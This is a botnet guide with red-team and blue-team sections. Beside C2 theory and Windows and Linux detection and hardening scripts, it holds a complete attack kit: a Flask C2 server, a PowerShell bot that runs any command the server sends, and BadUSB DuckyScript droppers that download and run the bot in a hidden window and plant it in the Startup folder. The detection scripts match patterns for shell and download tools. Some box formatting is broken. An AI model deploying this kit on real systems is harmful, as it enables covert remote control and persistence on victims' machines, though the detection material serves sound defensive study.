# BOTNET UNDERSTANDING - RED TEAM & BLUE TEAM GUIDE

## Botnet C2 Communication Methods

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ BOTNET COMMAND & CONTROL (C2) METHODS                                        │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ WHY C2 METHODS MATTER:                                                       │
│ ───────────────────────                                                      │
│ The C2 channel is how attackers control bots. Understanding these methods   │
│ helps defenders detect and disrupt botnets.                                  │
│                                                                              │
│ METHOD 1: CENTRALIZED C2 (HTTP/HTTPS)                                        │
│ ────────────────────────────────────────                                     │
│                                                                              │
│   ┌─────────┐                  ┌─────────┐                                  │
│   │   Bot   │ ──── HTTPS ────▶ │   C2    │                                  │
│   │         │ ◀─── Commands ── │ Server  │                                  │
│   └─────────┘                  └─────────┘                                  │
│                                                                              │
│ • Simple to implement                                                        │
│ • Uses standard web traffic (hard to block)                                  │
│ • Single point of failure (take down server = kill botnet)                   │
│ • Easy to detect with domain/IP blocklists                                   │
│                                                                              │
│ DETECTION (Blue Team):                                                       │
│ • Block known C2 domains/IPs                                                 │
│ • Monitor for beaconing patterns (regular intervals)                         │
│ • Analyze HTTP headers for anomalies                                         │
│ • Look for encoded/encrypted payloads in HTTP                                │
│                                                                              │
│                                                                              │
│ METHOD 2: PEER-TO-PEER (P2P) C2                                              │
│ ─────────────────────────────────                                            │
│                                                                              │
│   ┌───┐     ┌───┐     ┌───┐                                                 │
│   │Bot│◀───▶│Bot│◀───▶│Bot│                                                 │
│   └───┘     └───┘     └───┘                                                 │
│     │         │         │                                                    │
│     ▼         ▼         ▼                                                    │
│   ┌───┐     ┌───┐     ┌───┐                                                 │
│   │Bot│◀───▶│Bot│◀───▶│Bot│                                                 │
│   └───┘     └───┘     └───┘                                                 │
│                                                                              │
│ • No single point of failure                                                 │
│ • Very resilient to takedowns                                                │
│ • Commands propagate through network                                         │
│ • Examples: Gameover Zeus, Sality, Waledac                                   │
│                                                                              │
│ DETECTION (Blue Team):                                                       │
│ • Detect P2P protocols on corporate networks                                 │
│ • Monitor for unusual peer connections                                       │
│ • Look for custom protocols on non-standard ports                            │
│                                                                              │
│                                                                              │
│ METHOD 3: DOMAIN GENERATION ALGORITHM (DGA)                                  │
│ ───────────────────────────────────────────────                              │
│                                                                              │
│   Day 1: bot queries → abc123xyz.com (attacker registered)                   │
│   Day 2: bot queries → def456uvw.com (takedown)                              │
│   Day 3: bot queries → ghi789rst.com (attacker registered)                   │
│                                                                              │
│ • Generates thousands of pseudo-random domains                               │
│ • Attacker only needs to register a few                                      │
│ • Makes blocking extremely difficult                                         │
│ • Examples: Conficker, Cryptolocker, Necurs                                  │
│                                                                              │
│ DETECTION (Blue Team):                                                       │
│ • DNS entropy analysis (random-looking domains)                              │
│ • High NXDOMAIN response rates                                               │
│ • Machine learning for DGA detection                                         │
│ • Passive DNS monitoring                                                     │
│                                                                              │
│                                                                              │
│ METHOD 4: DNS-BASED C2                                                       │
│ ─────────────────────────                                                    │
│                                                                              │
│   Bot ──▶ DNS Query: command.evil.com (TXT) ──▶ Attacker's DNS              │
│   Bot ◀── DNS Response: "execute payload.exe" ◀──                            │
│                                                                              │
│ • Uses legitimate DNS infrastructure                                         │
│ • Hard to block (DNS is required for everything)                             │
│ • Commands embedded in DNS records (TXT, CNAME, etc.)                        │
│ • Examples: SUNBURST, DNSMessenger                                           │
│                                                                              │
│ DETECTION (Blue Team):                                                       │
│ • Monitor TXT record queries                                                 │
│ • Look for unusually long DNS responses                                      │
│ • Detect high query rates to single domain                                   │
│ • DNS log analysis for patterns                                              │
│                                                                              │
│                                                                              │
│ METHOD 5: SOCIAL MEDIA C2                                                    │
│ ────────────────────────────                                                 │
│                                                                              │
│   Bot ──▶ Twitter/Reddit/Pastebin ──▶ Reads commands from posts             │
│                                                                              │
│ • Uses legitimate platforms                                                  │
│ • Hard to block without blocking entire platform                             │
│ • Commands hidden in posts/comments/images                                   │
│ • Examples: Hammertoss, KINS                                                 │
│                                                                              │
│ DETECTION (Blue Team):                                                       │
│ • Monitor for regular API calls to social media                              │
│ • Look for unusual scraping patterns                                         │
│ • Behavioral analysis of social media access                                 │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

## Botnet Infection Vectors

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ HOW DEVICES BECOME PART OF A BOTNET                                          │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ UNDERSTANDING INFECTION VECTORS:                                             │
│ ──────────────────────────────────                                           │
│ Knowing how bots spread helps defenders prevent infections.                  │
│                                                                              │
│ VECTOR 1: PHISHING/MALSPAM                                                   │
│ ────────────────────────────                                                 │
│ • Malicious email attachments (macro-enabled docs)                           │
│ • Links to drive-by download sites                                           │
│ • Most common infection vector                                               │
│ • Examples: Emotet, TrickBot, Dridex                                         │
│                                                                              │
│ Email → User clicks → Macro executes → Downloads bot → Joins botnet          │
│                                                                              │
│                                                                              │
│ VECTOR 2: EXPLOIT KITS                                                       │
│ ─────────────────────────                                                    │
│ • Compromised/malicious websites                                             │
│ • Exploit browser/plugin vulnerabilities                                     │
│ • No user interaction required (drive-by)                                    │
│ • Examples: RIG EK, Fallout EK                                               │
│                                                                              │
│ User visits site → EK scans for vulns → Exploits browser → Installs bot      │
│                                                                              │
│                                                                              │
│ VECTOR 3: BADUSB / PHYSICAL ACCESS                                           │
│ ───────────────────────────────────                                          │
│ • Malicious USB devices (Flipper Zero, Rubber Ducky)                         │
│ • Dropped in parking lots, sent as "gifts"                                   │
│ • Bypasses network perimeter security                                        │
│ • Immediate code execution                                                   │
│                                                                              │
│ USB inserted → Payload types → Downloads bot → Joins botnet                  │
│                                                                              │
│ DUCKYSCRIPT EXAMPLE (For authorized testing):                                │
│ ┌───────────────────────────────────────────────────────────────────────┐   │
│ │ REM BadUSB Bot Installer (FOR TESTING ONLY)                           │   │
│ │ DELAY 1000                                                            │   │
│ │ GUI r                                                                  │   │
│ │ DELAY 500                                                             │   │
│ │ STRING powershell -w hidden -c "IEX(New-Object Net.WebClient).       │   │
│ │ DownloadString('http://test-server/bot.ps1')"                         │   │
│ │ ENTER                                                                  │   │
│ │                                                                        │   │
│ │ REM This demonstrates how quickly a device can be compromised         │   │
│ │ REM Always use in authorized lab environments only                    │   │
│ └───────────────────────────────────────────────────────────────────────┘   │
│                                                                              │
│                                                                              │
│ VECTOR 4: IoT EXPLOITATION                                                   │
│ ────────────────────────────                                                 │
│ • Default credentials on devices                                             │
│ • Unpatched vulnerabilities                                                  │
│ • Exposed management interfaces                                              │
│ • Examples: Mirai (Telnet brute-force), Bashlite                             │
│                                                                              │
│ Scanner finds device → Default creds/exploit → Installs bot                  │
│                                                                              │
│ COMMON IOT TARGETS:                                                          │
│ • IP cameras (default password: admin/admin)                                 │
│ • DVR/NVR systems                                                            │
│ • Home routers (admin/password)                                              │
│ • Smart home devices                                                         │
│ • Network printers                                                           │
│                                                                              │
│                                                                              │
│ VECTOR 5: LATERAL MOVEMENT (WORM-LIKE)                                       │
│ ────────────────────────────────────────                                     │
│ • Already inside network                                                     │
│ • Spreads using vulnerabilities (EternalBlue)                                │
│ • Credential theft for propagation                                           │
│ • Examples: WannaCry, NotPetya                                               │
│                                                                              │
│ Initial compromise → Scans network → Exploits neighbors → Spreads            │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

│                                                                              │

│                                                                              │
│ BOTNET SIMULATION COMPONENTS:                                                │
│ ───────────────────────────────                                              │
│                                                                              │
│ 1. C2 SERVER (Attacker Infrastructure)                                       │
│    • Web server to receive bot check-ins                                     │
│    • Command queue for bots                                                  │
│    • Data collection endpoint                                                │
│                                                                              │
│ 2. BOT AGENT (Runs on "infected" test systems)                               │
│    • Beacons to C2 at intervals                                              │
│    • Executes received commands                                              │
│    • Collects and exfiltrates data                                           │
│                                                                              │
│ 3. DROPPER (Initial access mechanism)                                        │
│    • BadUSB payload (Flipper Zero/Rubber Ducky)                              │
│    • Phishing simulation                                                     │
│    • Exploit delivery                                                        │
│                                                                              │
│                                                                              │
│ SIMPLE C2 SIMULATION (Python Flask):                                         │
│ ──────────────────────────────────────                                       │
│ This demonstrates how C2 works for educational purposes:                     │
│                                                                              │
│ # c2_server.py - Educational C2 Server                                       │
│ from flask import Flask, request, jsonify                                    │
│ import time                                                                  │
│                                                                              │
│ app = Flask(__name__)                                                        │
│ bots = {}                                                                    │
│ commands = {}                                                                │
│                                                                              │
│ @app.route('/checkin', methods=['POST'])                                     │
│ def checkin():                                                               │
│     data = request.json                                                      │
│     bot_id = data.get('id')                                                  │
│     bots[bot_id] = {                                                         │
│         'last_seen': time.time(),                                            │
│         'hostname': data.get('hostname'),                                    │
│         'ip': request.remote_addr                                            │
│     }                                                                        │
│     # Return pending commands                                                │
│     cmd = commands.pop(bot_id, None)                                         │
│     return jsonify({'command': cmd})                                         │
│                                                                              │
│ @app.route('/result', methods=['POST'])                                      │
│ def result():                                                                │
│     data = request.json                                                      │
│     print(f"Result from {data['id']}: {data['output']}")                     │
│     return jsonify({'status': 'received'})                                   │
│                                                                              │
│                                                                              │
│ BOT SIMULATION (PowerShell):                                                 │
│ ──────────────────────────────                                               │
│                                                                              │
│ # bot_agent.ps1 - Educational Bot Agent                                      │
│ $C2Server = "http://YOUR_TEST_SERVER"                                        │
│ $BotID = [guid]::NewGuid().ToString()                                        │
│                                                                              │
│ while ($true) {                                                              │
│     try {                                                                    │
│         # Check in with C2                                                   │
│         $body = @{                                                           │
│             id = $BotID                                                      │
│             hostname = $env:COMPUTERNAME                                     │
│         } | ConvertTo-Json                                                   │
│                                                                              │
│         $response = Invoke-RestMethod -Uri "$C2Server/checkin" `             │
│                     -Method POST -Body $body -ContentType 'application/json' │
│                                                                              │
│         # Execute command if received                                        │
│         if ($response.command) {                                             │
│             $output = Invoke-Expression $response.command                    │
│             # Send result back                                               │
│             $result = @{                                                     │
│                 id = $BotID                                                  │
│                 output = $output                                             │
│             } | ConvertTo-Json                                               │
│             Invoke-RestMethod -Uri "$C2Server/result" `                      │
│                 -Method POST -Body $result -ContentType 'application/json'   │
│         }                                                                    │
│     } catch {}                                                               │
│                                                                              │
│     # Beacon interval (random to avoid detection)                            │
│     Start-Sleep -Seconds (Get-Random -Minimum 30 -Maximum 120)               │
│ }                                                                            │
│                                                                              │
│                                                                              │
│ DUCKYSCRIPT DROPPER FOR BOT:                                                 │
│ ─────────────────────────────                                                │
│ This deploys the bot agent via BadUSB (authorized testing only):             │
│                                                                              │
│ ┌───────────────────────────────────────────────────────────────────────┐   │
│ │ REM Bot Deployment via BadUSB (AUTHORIZED TESTING ONLY)               │   │
│ │ REM Used to test detection capabilities                               │   │
│ │                                                                        │   │
│ │ DELAY 1000                                                            │   │
│ │ GUI r                                                                  │   │
│ │ DELAY 500                                                             │   │
│ │ STRING powershell -w hidden -ep bypass                                 │   │
│ │ ENTER                                                                  │   │
│ │ DELAY 1000                                                            │   │
│ │                                                                        │   │
│ │ REM Download and execute bot agent                                     │   │
│ │ STRING $ProgressPreference='SilentlyContinue'                          │   │
│ │ ENTER                                                                  │   │
│ │ STRING IEX(New-Object Net.WebClient).DownloadString(                   │   │
│ │ STRING 'http://TEST_SERVER/bot_agent.ps1')                             │   │
│ │ ENTER                                                                  │   │
│ │                                                                        │   │
│ │ REM For persistence testing, add to startup                            │   │
│ │ DELAY 500                                                             │   │
│ │ STRING $startup = "$env:APPDATA\Microsoft\Windows\Start Menu\          │   │
│ │ STRING Programs\Startup\update.ps1"                                    │   │
│ │ ENTER                                                                  │   │
│ │ STRING (New-Object Net.WebClient).DownloadFile(                        │   │
│ │ STRING 'http://TEST_SERVER/bot_agent.ps1', $startup)                   │   │
│ │ ENTER                                                                  │   │
│ └───────────────────────────────────────────────────────────────────────┘   │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

## Blue Team: Botnet Detection and Response

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ BLUE TEAM: DETECTING AND RESPONDING TO BOTNETS                               │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ BOTNET DETECTION STRATEGIES:                                                 │
│ ─────────────────────────────                                                │
│                                                                              │
│ DETECTION LAYER 1: NETWORK MONITORING                                        │
│ ────────────────────────────────────────                                     │
│                                                                              │
│ 1. BEACONING DETECTION                                                       │
│    Bots check in at regular intervals (beaconing).                           │
│    Look for:                                                                 │
│    • Regular connection intervals (every 60 seconds, etc.)                   │
│    • Connections to same IP/domain repeatedly                                │
│    • Small data transfers at regular intervals                               │
│                                                                              │
│    Detection Query (SIEM):                                                   │
│    ┌────────────────────────────────────────────────────────────────────┐   │
│    │ index=firewall                                                     │   │
│    │ | bin _time span=1m                                                │   │
│    │ | stats count by src_ip, dest_ip, _time                            │   │
│    │ | eventstats stdev(count) as stdev, avg(count) as avg by           │   │
│    │   src_ip, dest_ip                                                  │   │
│    │ | where stdev < 0.5 AND count > 50  /* Regular pattern */          │   │
│    │ | table src_ip, dest_ip, stdev, avg                                │   │
│    └────────────────────────────────────────────────────────────────────┘   │
│                                                                              │
│ 2. DNS ANOMALY DETECTION                                                     │
│    • High volume of NXDOMAIN responses (DGA indicator)                       │
│    • Queries to newly registered domains                                     │
│    • Long/random domain names                                                │
│    • TXT record queries                                                      │
│                                                                              │
│ 3. TRAFFIC VOLUME ANALYSIS                                                   │
│    • Unusual outbound traffic patterns                                       │
│    • Data transfers during off-hours                                         │
│    • Connections to known-bad IPs                                            │
│                                                                              │
│                                                                              │
│ DETECTION LAYER 2: ENDPOINT MONITORING                                       │
│ ────────────────────────────────────────                                     │
│                                                                              │
│ 1. PROCESS MONITORING                                                        │
│    • Unknown processes with network connections                              │
│    • Processes running from temp directories                                 │
│    • Persistence mechanisms (run keys, scheduled tasks)                      │
│                                                                              │
│ 2. FILE SYSTEM MONITORING                                                    │
│    • New executables in user directories                                     │
│    • Files with suspicious extensions                                        │
│    • Hidden files/directories                                                │
│                                                                              │

### PowerShell: Windows Bot Detection Script

```powershell
# =====================================================
# BOTNET DETECTION SCRIPT FOR WINDOWS
# Purpose: Detect signs of bot infection
# Run: As Administrator
# =====================================================

$LogPath = "C:\SecurityLogs\BotDetection.log"
$AlertLevel = "CLEAN"
$Findings = @()

function Write-Log {
    param([string]$Message, [string]$Level = "INFO")
    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $Entry = "[$Timestamp] [$Level] $Message"
    Add-Content -Path $LogPath -Value $Entry
    Write-Host $Entry -ForegroundColor $(switch($Level) {
        "CRITICAL" { "Red" }
        "WARNING" { "Yellow" }
        "INFO" { "White" }
        default { "Gray" }
    })
}

Write-Host "==========================================="
Write-Host "  BOTNET DETECTION SCAN"
Write-Host "  $(Get-Date)"
Write-Host "==========================================="
Write-Host ""

# === CHECK 1: Suspicious Network Connections ===
Write-Log "Checking for suspicious network connections..."

$SuspiciousPorts = @(4444, 5555, 6666, 1337, 31337, 9001, 9002)
$connections = Get-NetTCPConnection -State Established 2>$null

foreach ($conn in $connections) {
    # Check for suspicious ports
    if ($SuspiciousPorts -contains $conn.RemotePort) {
        $process = Get-Process -Id $conn.OwningProcess -ErrorAction SilentlyContinue
        $Findings += "Suspicious port connection: $($conn.RemoteAddress):$($conn.RemotePort) by $($process.Name)"
        $AlertLevel = "CRITICAL"
    }

    # Check for connections from PowerShell/CMD
    $process = Get-Process -Id $conn.OwningProcess -ErrorAction SilentlyContinue
    if ($process.Name -match "powershell|cmd|wscript|cscript") {
        $Findings += "Shell process with network connection: $($process.Name) -> $($conn.RemoteAddress)"
        if ($AlertLevel -ne "CRITICAL") { $AlertLevel = "WARNING" }
    }
}

# === CHECK 2: Beaconing Detection ===
Write-Log "Analyzing connection patterns for beaconing..."

$connectionGroups = $connections | Group-Object RemoteAddress
foreach ($group in $connectionGroups) {
    if ($group.Count -gt 5) {
        $Findings += "Multiple connections to same host: $($group.Name) (Count: $($group.Count))"
        if ($AlertLevel -eq "CLEAN") { $AlertLevel = "WARNING" }
    }
}

# === CHECK 3: Persistence Mechanisms ===
Write-Log "Checking common persistence locations..."

# Registry Run Keys
$runKeys = @(
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
)

foreach ($key in $runKeys) {
    if (Test-Path $key) {
        $values = Get-ItemProperty $key -ErrorAction SilentlyContinue
        $values.PSObject.Properties | Where-Object { $_.Name -notmatch "^PS" } | ForEach-Object {
            $value = $_.Value
            if ($value -match "powershell|cmd|wscript|http|temp|appdata") {
                $Findings += "Suspicious registry persistence: $key\$($_.Name) = $value"
                $AlertLevel = "CRITICAL"
            }
        }
    }
}

# Scheduled Tasks
$tasks = Get-ScheduledTask | Where-Object { $_.State -eq "Ready" }
foreach ($task in $tasks) {
    $action = ($task.Actions | Select-Object -First 1).Execute
    if ($action -match "powershell|cmd|wscript|http|temp") {
        $Findings += "Suspicious scheduled task: $($task.TaskName) -> $action"
        if ($AlertLevel -ne "CRITICAL") { $AlertLevel = "WARNING" }
    }
}

# === CHECK 4: Suspicious Processes ===
Write-Log "Scanning for suspicious processes..."

$processes = Get-Process | Select-Object Name, Id, Path, Company

foreach ($proc in $processes) {
    # Process without path (potentially injected)
    if ($proc.Path -eq $null -and $proc.Name -notin @("Idle","System")) {
        $Findings += "Process without path: $($proc.Name) (PID: $($proc.Id))"
        if ($AlertLevel -eq "CLEAN") { $AlertLevel = "WARNING" }
    }

    # Process running from temp
    if ($proc.Path -match "\\Temp\\|\\tmp\\|\\AppData\\Local\\Temp") {
        $Findings += "Process running from temp: $($proc.Name) at $($proc.Path)"
        $AlertLevel = "CRITICAL"
    }
}

# === CHECK 5: DNS Cache Analysis ===
Write-Log "Analyzing DNS cache for suspicious domains..."

$dnsCache = Get-DnsClientCache
$suspiciousTLDs = @(".ru", ".cn", ".top", ".xyz", ".tk", ".ml", ".ga")

foreach ($entry in $dnsCache) {
    foreach ($tld in $suspiciousTLDs) {
        if ($entry.Name.EndsWith($tld)) {
            $Findings += "Suspicious domain in DNS cache: $($entry.Name)"
            if ($AlertLevel -eq "CLEAN") { $AlertLevel = "WARNING" }
        }
    }

    # Check for DGA-like domains
    $domain = ($entry.Name -split "\.")[-2]
    if ($domain.Length -gt 12 -and $domain -match "^[a-z0-9]+$") {
        $vowels = ($domain.ToCharArray() | Where-Object { $_ -match "[aeiou]" }).Count
        if ($vowels -lt 2) {
            $Findings += "Possible DGA domain: $($entry.Name)"
            if ($AlertLevel -ne "CRITICAL") { $AlertLevel = "WARNING" }
        }
    }
}

# === CHECK 6: Open Ports Listening ===
Write-Log "Checking for unexpected listening ports..."

$listeners = Get-NetTCPConnection -State Listen
$expectedPorts = @(135, 139, 445, 3389, 5985, 5986)  # Customize for your environment

foreach ($listener in $listeners) {
    if ($listener.LocalPort -notin $expectedPorts) {
        $process = Get-Process -Id $listener.OwningProcess -ErrorAction SilentlyContinue
        if ($process.Name -notmatch "System|svchost|services") {
            $Findings += "Unexpected listener: Port $($listener.LocalPort) by $($process.Name)"
            if ($AlertLevel -eq "CLEAN") { $AlertLevel = "WARNING" }
        }
    }
}

# === RESULTS ===
Write-Host ""
Write-Host "==========================================="
Write-Host "  SCAN RESULTS"
Write-Host "==========================================="
Write-Host ""

if ($Findings.Count -eq 0) {
    Write-Host "[CLEAN] No obvious bot indicators found" -ForegroundColor Green
} else {
    Write-Host "[ALERT: $AlertLevel] Found $($Findings.Count) potential indicators" -ForegroundColor $(
        if ($AlertLevel -eq "CRITICAL") { "Red" } else { "Yellow" }
    )
    Write-Host ""
    foreach ($finding in $Findings) {
        Write-Log $finding $AlertLevel
    }
}

Write-Host ""
Write-Host "Full log saved to: $LogPath"
```

### Bash: Linux Bot Detection Script

```bash
#!/bin/bash
# =====================================================
# BOTNET DETECTION SCRIPT FOR LINUX
# Purpose: Detect signs of bot infection
# Run: As root (sudo)
# =====================================================

LOG_FILE="/var/log/bot_detection.log"
ALERT_LEVEL="CLEAN"
declare -a FINDINGS

log() {
    local level=$1
    local message=$2
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] [$level] $message" | tee -a "$LOG_FILE"
}

echo "==========================================="
echo "  BOTNET DETECTION SCAN"
echo "  $(date)"
echo "==========================================="
echo ""

# === CHECK 1: Suspicious Network Connections ===
log "INFO" "Checking for suspicious network connections..."

SUSPICIOUS_PORTS="4444|5555|6666|1337|31337|9001|9002"
SUSPICIOUS_CONNS=$(ss -tunapl 2>/dev/null | grep -E ":($SUSPICIOUS_PORTS)\s" | grep ESTAB)

if [ -n "$SUSPICIOUS_CONNS" ]; then
    FINDINGS+=("Connections on suspicious ports found")
    ALERT_LEVEL="CRITICAL"
    echo "$SUSPICIOUS_CONNS" >> "$LOG_FILE"
fi

# Check for shell processes with network connections
SHELL_NET=$(lsof -i -P 2>/dev/null | grep -E "(bash|sh|python|perl|ruby)" | grep ESTAB)
if [ -n "$SHELL_NET" ]; then
    FINDINGS+=("Shell processes with network connections found")
    [ "$ALERT_LEVEL" != "CRITICAL" ] && ALERT_LEVEL="WARNING"
    echo "$SHELL_NET" >> "$LOG_FILE"
fi

# === CHECK 2: Suspicious Cron Jobs ===
log "INFO" "Checking cron jobs for suspicious entries..."

for cron in /etc/crontab /etc/cron.d/* /var/spool/cron/crontabs/*; do
    if [ -f "$cron" ]; then
        SUSPICIOUS_CRON=$(grep -E "(curl|wget|nc |ncat|bash -i|python.*-c|perl.*-e|http://|https://)" "$cron" 2>/dev/null)
        if [ -n "$SUSPICIOUS_CRON" ]; then
            FINDINGS+=("Suspicious cron entry in $cron")
            ALERT_LEVEL="CRITICAL"
            echo "$SUSPICIOUS_CRON" >> "$LOG_FILE"
        fi
    fi
done

# === CHECK 3: Processes Running from /tmp ===
log "INFO" "Checking for processes running from temporary directories..."

TMP_PROCS=$(ls -la /proc/*/exe 2>/dev/null | grep -E "(tmp|dev/shm)" | head -20)
if [ -n "$TMP_PROCS" ]; then
    FINDINGS+=("Processes running from /tmp or /dev/shm")
    ALERT_LEVEL="CRITICAL"
    echo "$TMP_PROCS" >> "$LOG_FILE"
fi

# === CHECK 4: Suspicious Systemd Services ===
log "INFO" "Checking systemd services..."

SUSPICIOUS_SERVICES=$(systemctl list-units --type=service --state=running 2>/dev/null | \
    grep -vE "(NetworkManager|ssh|cron|rsyslog|systemd)" | \
    awk '{print $1}' | head -20)

for svc in $SUSPICIOUS_SERVICES; do
    svc_file=$(systemctl show "$svc" -p FragmentPath 2>/dev/null | cut -d= -f2)
    if [ -f "$svc_file" ]; then
        if grep -qE "(curl|wget|nc |http://|https://|/tmp/)" "$svc_file" 2>/dev/null; then
            FINDINGS+=("Suspicious service: $svc")
            [ "$ALERT_LEVEL" != "CRITICAL" ] && ALERT_LEVEL="WARNING"
        fi
    fi
done

# === CHECK 5: SSH Authorized Keys ===
log "INFO" "Checking SSH authorized_keys for anomalies..."

for home in /home/* /root; do
    auth_keys="$home/.ssh/authorized_keys"
    if [ -f "$auth_keys" ]; then
        # Check for command= prefixes (could be backdoor)
        CMD_KEYS=$(grep "command=" "$auth_keys" 2>/dev/null)
        if [ -n "$CMD_KEYS" ]; then
            FINDINGS+=("Command-forced SSH keys in $auth_keys")
            [ "$ALERT_LEVEL" != "CRITICAL" ] && ALERT_LEVEL="WARNING"
        fi

        # Check for recently added keys
        if [ $(find "$auth_keys" -mtime -1 2>/dev/null | wc -l) -gt 0 ]; then
            FINDINGS+=("Recently modified authorized_keys: $auth_keys")
            [ "$ALERT_LEVEL" != "CRITICAL" ] && ALERT_LEVEL="WARNING"
        fi
    fi
done

# === CHECK 6: Unusual Listeners ===
log "INFO" "Checking for unusual listening ports..."

EXPECTED_PORTS="22|80|443|25|53|3306|5432"
UNUSUAL_LISTENERS=$(ss -tulnp 2>/dev/null | grep LISTEN | grep -vE ":($EXPECTED_PORTS)\s" | head -20)

if [ -n "$UNUSUAL_LISTENERS" ]; then
    FINDINGS+=("Unusual listening ports found")
    [ "$ALERT_LEVEL" == "CLEAN" ] && ALERT_LEVEL="WARNING"
    echo "$UNUSUAL_LISTENERS" >> "$LOG_FILE"
fi

# === CHECK 7: Hidden Processes ===
log "INFO" "Checking for hidden processes..."

PS_COUNT=$(ps aux 2>/dev/null | wc -l)
PROC_COUNT=$(ls -1 /proc 2>/dev/null | grep -E '^[0-9]+$' | wc -l)
DIFF=$((PROC_COUNT - PS_COUNT))

if [ $DIFF -gt 5 ]; then
    FINDINGS+=("Possible hidden processes (diff: $DIFF)")
    ALERT_LEVEL="CRITICAL"
fi

# === CHECK 8: LD_PRELOAD Hijacking ===
log "INFO" "Checking for LD_PRELOAD hijacking..."

if [ -n "$LD_PRELOAD" ]; then
    FINDINGS+=("LD_PRELOAD environment variable set: $LD_PRELOAD")
    ALERT_LEVEL="CRITICAL"
fi

if [ -f /etc/ld.so.preload ] && [ -s /etc/ld.so.preload ]; then
    FINDINGS+=("ld.so.preload contains entries")
    ALERT_LEVEL="CRITICAL"
    cat /etc/ld.so.preload >> "$LOG_FILE"
fi

# === RESULTS ===
echo ""
echo "==========================================="
echo "  SCAN RESULTS"
echo "==========================================="
echo ""

if [ ${#FINDINGS[@]} -eq 0 ]; then
    echo -e "\033[32m[CLEAN] No obvious bot indicators found\033[0m"
else
    if [ "$ALERT_LEVEL" == "CRITICAL" ]; then
        echo -e "\033[31m[ALERT: $ALERT_LEVEL] Found ${#FINDINGS[@]} potential indicators\033[0m"
    else
        echo -e "\033[33m[ALERT: $ALERT_LEVEL] Found ${#FINDINGS[@]} potential indicators\033[0m"
    fi
    echo ""
    for finding in "${FINDINGS[@]}"; do
        log "$ALERT_LEVEL" "$finding"
    done
fi

echo ""
echo "Full log saved to: $LOG_FILE"
```

### PowerShell: Windows Hardening Script

```powershell
# =====================================================
# WINDOWS SECURITY HARDENING SCRIPT
# Purpose: Apply security baseline configurations
# Run: As Administrator (elevated PowerShell)
# WARNING: Test in lab environment first!
# =====================================================

param(
    [switch]$Apply,
    [switch]$Audit
)

$Results = @()

function Test-Setting {
    param(
        [string]$Name,
        [scriptblock]$Test,
        [scriptblock]$Remediation
    )

    $result = @{
        Name = $Name
        Compliant = $false
        Action = "None"
    }

    try {
        $result.Compliant = & $Test
    } catch {
        $result.Compliant = $false
    }

    if (-not $result.Compliant -and $Apply) {
        try {
            & $Remediation
            $result.Compliant = $true
            $result.Action = "Fixed"
        } catch {
            $result.Action = "Failed: $_"
        }
    } elseif (-not $result.Compliant) {
        $result.Action = "Needs remediation"
    }

    return $result
}

Write-Host "Windows Security Hardening Check" -ForegroundColor Cyan
Write-Host "=================================" -ForegroundColor Cyan
Write-Host ""

# Check 1: SMBv1 Disabled
$Results += Test-Setting -Name "SMBv1 Disabled" -Test {
    $smb1 = Get-WindowsOptionalFeature -Online -FeatureName SMB1Protocol
    return $smb1.State -eq "Disabled"
} -Remediation {
    Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -NoRestart
}

# Check 2: PowerShell Logging Enabled
$Results += Test-Setting -Name "PowerShell Script Block Logging" -Test {
    $path = "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
    if (Test-Path $path) {
        return (Get-ItemProperty $path).EnableScriptBlockLogging -eq 1
    }
    return $false
} -Remediation {
    $path = "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
    New-Item -Path $path -Force | Out-Null
    Set-ItemProperty -Path $path -Name "EnableScriptBlockLogging" -Value 1
}

# Check 3: WDigest Disabled
$Results += Test-Setting -Name "WDigest Credential Caching Disabled" -Test {
    $path = "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest"
    if (Test-Path $path) {
        $value = (Get-ItemProperty $path -ErrorAction SilentlyContinue).UseLogonCredential
        return $value -eq 0
    }
    return $false
} -Remediation {
    $path = "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest"
    Set-ItemProperty -Path $path -Name "UseLogonCredential" -Value 0
}

# Check 4: Windows Defender Enabled
$Results += Test-Setting -Name "Windows Defender Enabled" -Test {
    $status = Get-MpComputerStatus -ErrorAction SilentlyContinue
    return $status.AntivirusEnabled -eq $true
} -Remediation {
    Set-MpPreference -DisableRealtimeMonitoring $false
}

# Check 5: Command Line Auditing
$Results += Test-Setting -Name "Command Line Process Auditing" -Test {
    $path = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit"
    if (Test-Path $path) {
        return (Get-ItemProperty $path -ErrorAction SilentlyContinue).ProcessCreationIncludeCmdLine_Enabled -eq 1
    }
    return $false
} -Remediation {
    $path = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit"
    New-Item -Path $path -Force | Out-Null
    Set-ItemProperty -Path $path -Name "ProcessCreationIncludeCmdLine_Enabled" -Value 1
}

# Check 6: USB Storage Restriction (Audit only)
$Results += Test-Setting -Name "USB Storage Restricted" -Test {
    $path = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\RemovableStorageDevices\{53f5630d-b6bf-11d0-94f2-00a0c91efb8b}"
    if (Test-Path $path) {
        $deny = (Get-ItemProperty $path -ErrorAction SilentlyContinue).Deny_All
        return $deny -eq 1
    }
    return $false
} -Remediation {
    Write-Host "USB restriction requires GPO - implement via Group Policy" -ForegroundColor Yellow
}

# Display Results
Write-Host ""
Write-Host "Results:" -ForegroundColor Cyan
Write-Host "--------" -ForegroundColor Cyan

foreach ($result in $Results) {
    $color = if ($result.Compliant) { "Green" } else { "Red" }
